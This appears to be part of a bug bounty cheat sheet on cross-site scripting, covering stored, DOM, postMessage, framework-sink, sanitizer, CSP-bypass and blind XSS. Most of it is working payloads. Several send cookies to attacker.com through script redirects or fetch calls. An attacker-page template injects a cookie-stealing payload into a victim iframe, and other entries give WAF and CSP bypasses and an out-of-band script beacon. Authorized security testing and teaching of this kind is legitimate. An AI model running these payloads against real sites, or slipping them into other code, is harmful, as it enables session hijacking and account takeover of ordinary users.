## 3. XSS — CROSS-SITE SCRIPTING

### Stored XSS (highest impact)
```
Input: "<script>document.location='https://attacker.com/c?c='+document.cookie</script>"
Any user viewing page executes attacker JS → cookie theft → session hijack
```

### DOM XSS Sinks (grep for these)
```javascript
innerHTML = userInput           // HIGH RISK
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)      // string form
element.src = userInput         // JavaScript URI possible
location.href = userInput
```

> **postMessage is a DOM XSS source** — same sinks above (innerHTML, eval, etc.) become reachable when fed by `addEventListener("message", ...)` without proper `event.origin` validation. See **postMessage Testing** below.

### XSS Bypass Techniques
```javascript
// CSP bypass — unsafe-inline blocked
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
// Angular template injection
{{constructor.constructor('alert(1)')()}}
// mXSS — mutation-based
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### XSS Chains (escalate to High/Critical)
- XSS + sensitive page (banking/admin) = High
- XSS + CSRF token theft = CSRF bypass on critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- **No JS allowed?** CSS injection can still exfil tokens via attribute selectors — see **CSS Injection**

**WAF bypass for XSS**: Run `tools/waf_encoder.py "<payload>" --class xss` to get 20+ variants (HTML entity, unicode escape, base64-wrapped) — *optional wrapper; if absent, hand-encode from the variants here or use Burp Intruder payload-processing*. Try `<svg onload=eval(atob('...'))>` or `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` when `<script>` is blocked. Probe which chars are allowed by testing individually, then construct payload from unblocked chars.

### postMessage Testing
DOM XSS variant where `window.addEventListener("message", ...)` lacks proper `event.origin` validation. Common on SDK callbacks, OAuth redirect handlers, iframe widgets, chat/analytics scripts — easy to miss because the entry point is **indirect** (no URL parameter, no form field, source-code grep alone doesn't reveal whether the origin check is sound).

**Vulnerable pattern:**
```js
window.addEventListener("message", (e) => {
  // No e.origin check → any page can postMessage in
  document.getElementById("x").innerHTML = e.data
})
```

**Common origin-check bypasses:**

| Weak check | Bypass | Example that passes |
|---|---|---|
| `e.origin.indexOf("trusted")` | substring anywhere | `https://trusted.attacker.com` |
| `e.origin.startsWith("https://trusted")` | suffix attack | `https://trusted.attacker.com` |
| `e.origin.endsWith(".trusted.com")` | infix attack | `https://evil-trusted.com` (no dot prefix) |
| `e.origin === "null"` | sandboxed iframe | `srcdoc`/`sandbox` iframe → origin literally `"null"` |
| Regex with unescaped `.` | `.` matches any char | `/https?:\/\/trusted\.com/` matches `https://trusted-com.evil.com` |
| No check at all | (just listen) | Any origin |

**Finding listeners:**
```js
// DevTools console (Chromium) — list every message listener registered on window
getEventListeners(window).message
```
```bash
# Source grep when you have JS bundles
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js" | grep -v node_modules
```
- Burp extension: **postMessage-tracker** — auto-logs every postMessage with sender origin
- The actual signal is whether the **sink fires**, not whether a listener exists — always confirm with the attacker page below

**Attacker page template:**
```html
<!-- Hosted on attacker.com -->
<iframe src="https://victim.com" id="v"></iframe>
<script>
  document.getElementById('v').onload = () => {
    document.getElementById('v').contentWindow.postMessage(
      '<img src=x onerror=fetch("//attacker.com/?c="+document.cookie)>',
      '*'  // wildcard target — works regardless of origin policy on send
    )
  }
</script>
```

**Chains That Pay:**
```
postMessage -> innerHTML/eval sink -> DOM XSS                          High
postMessage -> OAuth code/state passing -> code theft -> ATO           Critical
postMessage -> localStorage token override -> session manipulation     High
postMessage -> JSON deserialize sink (eval/Function) -> RCE            Critical (rare)
postMessage handler strict-equals origin (no bypass found)             N/A
SDK postMessage with internal-only contract (no public callers)        Info (chain only)
```

**Triage:**
```
Listener missing origin check + reachable XSS sink (innerHTML/eval)   = High/Critical
Listener missing origin check + OAuth code/state flows through it     = Critical (ATO)
Listener present + origin check has substring/regex bypass            = same severity, PoC required
Listener present + strict equality on origin (=== exact match)        = N/A
Listener exists but only logs / no DOM mutation                       = Low/Info
```

### Framework-Specific Sinks (auto-escaping bypasses)
Modern SPAs auto-escape text, so XSS lives in the **explicit raw-HTML / URL escape hatches** and in server-side data that reaches them. Grep the bundle for these — they are the *only* places default protection is off.

| Framework | Sink that bypasses escaping | Also dangerous |
|---|---|---|
| React | `dangerouslySetInnerHTML={{__html: x}}` | `href={x}` with `javascript:`, `ref` callback writing `.innerHTML`, `<a target=_blank>` reverse-tabnab |
| Vue | `v-html="x"` | `:href="x"` javascript:, dynamic `<component :is="x">` |
| Angular | `[innerHTML]=x` (only if `bypassSecurityTrustHtml` used), `bypassSecurityTrust*()` | template injection `{{}}` on server-rendered strings, `[src]`/`[href]` resource URLs |
| Svelte | `{@html x}` | `<svelte:element this={x}>` |
| jQuery (legacy) | `$(x)`, `.html(x)`, `.append(x)` | selector-as-HTML: `$("<div>"+x)` |

- **Signal:** the value in the sink traces back to a URL param, `postMessage`, `localStorage`, or an API field an attacker controls. Auto-escaped text output is **not** a finding — confirm the data lands in a raw sink.

### DOMPurify / Sanitizer Bypass (mXSS)
When the app *does* sanitize, the bug is a **mutation-XSS**: markup that is inert to the parser DOMPurify sees, but re-parses into script after the browser's serialize→reparse (innerHTML round-trip), or via namespace confusion (`<svg>`/`<math>`/`<template>`).
- Always **fingerprint the version first** — `DOMPurify.version` in console. Bypasses are version-specific; a payload for 2.x may be patched in 3.x. Report only against the deployed version.
- Namespace-confusion shape (concept, not a universal payload): `<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>`. Test the app's actual config (`ALLOWED_TAGS`, `FORBID_ATTR`) — a custom relaxed config is a far more likely bug than a 0-day in DOMPurify itself.
- **FP-kill:** if `alert(1)` never fires in the *target's* sanitizer config, it is not a finding — a bypass on the default config doesn't count if the app forbids the tags you used.

### CSP Bypass (when input reflects but won't execute)
Reflected input under a CSP is only a bug if you can **execute under the deployed policy**. Read the exact `Content-Security-Policy` header first, then match:

| Policy weakness | Exploitation |
|---|---|
| `script-src 'self'` + a JSONP endpoint on-origin | `<script src="/api/jsonp?callback=alert(1)//"></script>` — the classic same-origin gadget |
| Allow-listed CDN hosting a known gadget (AngularJS, older frameworks) | inject the framework + a template-injection expression it evaluates |
| `'strict-dynamic'` + an injectable existing `<script>` you can influence | ride the trusted script to `document.createElement('script')` |
| `nonce-…` reused across responses or predictable | replay/predict the nonce onto your injected `<script nonce=…>` |
| Missing `base-uri` | inject `<base href=//attacker>` to hijack relative script src |
| `unsafe-eval` present | any gadget reaching `eval`/`Function`/template compiler runs |

- **FP-kill:** `script-src 'self'` with no on-origin JSONP/gadget and no `unsafe-eval`/`unsafe-inline` is *working as intended* — reflected-but-blocked is Info, not XSS.

### Blind XSS (fires in someone else's session)
Payloads that execute later, in a context you never see — the highest-value stored XSS because it lands in **privileged** viewers.
- **Surfaces:** support tickets, admin dashboards, invoice/PDF generators, user-agent/referer logs, HR/applicant portals, `X-Forwarded-For` in log viewers, contact-us, delivery-address fields shown to fulfilment staff.
- **Payload:** an out-of-band beacon so you learn when/where it fired — `"><script src=//YOURID.oastify.com></script>` or ezXSS/XSS-Hunter. Capture `document.domain`, cookies, DOM, and the viewer's URL to prove it fired in an internal/admin origin.
- **FP-kill:** a callback to your collaborator proves execution; a callback that only carries *your own* session/domain is self-XSS. Impact = whose context it fired in.
